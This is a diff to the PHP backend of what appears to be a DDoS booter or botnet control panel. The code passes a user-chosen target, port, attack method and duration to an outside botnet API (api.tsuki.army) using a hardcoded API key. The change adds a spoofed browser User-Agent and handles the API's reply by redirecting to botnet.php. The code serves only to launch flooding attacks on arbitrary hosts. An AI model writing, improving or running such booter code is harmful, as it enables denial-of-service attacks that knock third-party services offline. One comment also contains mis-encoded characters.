@@ -31,18 +31,34 @@
             botnet_api_error("Invalid attack duration (1-120 seconds)");
         }
 
-        // Prepare API request
         $url = "https://api.tsuki.army/v2/start?api_key=tsuki-army-nyaadhhd&user=6643&target=".$target."&time=".$time."&method=".$method."&port=".$port."";
+        $options = array(
+            'http' => array(
+                'header' => "User-Agent: Mozilla/5.0\r\n" // Dodajemy nag³ówek User-Agent
+            )
+        );
+        $context = stream_context_create($options);
 
-        $api_response = file_get_contents($url);
+        $api_response = file_get_contents($url, false, $context);
+
         if ($api_response === false) {
             botnet_api_error("API Request Failed");
         }
 
         $api_data = json_decode($api_response, true);
         if ($api_data !== null) {
-            echo $api_data;
-            exit();
+            $status = $api_data['status'];
+            $ret_data = $api_data['message'];
+
+            if($status) {
+                $_SESSION['error_style'] = 1;
+                $_SESSION['error_message'] = $ret_data;
+                header('Location: botnet.php');
+                exit;
+            } else {
+                botnet_api_error($ret_data);
+            }
         }
+
     }
 ?>
